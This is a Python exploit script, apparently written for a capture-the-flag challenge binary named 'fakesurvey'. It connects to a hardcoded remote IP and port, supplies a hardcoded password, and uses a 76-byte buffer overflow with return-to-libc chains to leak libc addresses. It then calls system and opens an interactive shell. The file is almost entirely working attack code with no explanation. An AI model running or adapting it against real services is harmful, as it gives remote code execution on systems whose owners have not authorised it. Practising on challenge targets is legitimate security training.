#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from rootkit import *

exe = context.binary = ELF('./fakesurvey')

host = args.HOST or '185.235.41.205'
port = int(args.PORT or 7050)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *main+606
continue
'''.format(**locals())

# -- Exploit goes here --
libc = ELF("./libc3.so")
io = start()
re()
payload = f"%{18}$s"
# gdb.attach(io.pid, gdbscript=gdbscript)
sl("CPRSyRMOFa3FVIF")
re()
payload=b"A"*76 + ret2libcleak('__libc_start_main')
sl(payload)
reu("***\n")
__libc_start_main = uu64(ren(4))
log.info(f"libc start main leak : {hex(__libc_start_main)}")


re()
sl("CPRSyRMOFa3FVIF")
payload=b"A"*76 + ret2libcleak('puts')
sl(payload)
reu("***\n")
puts_leak = uu64(ren(4))
log.info(f"puts leak : {hex(puts_leak)}")

re()
sl("CPRSyRMOFa3FVIF")
payload=b"A"*76 + ret2libcsystem()
sl(payload)

io.interactive()

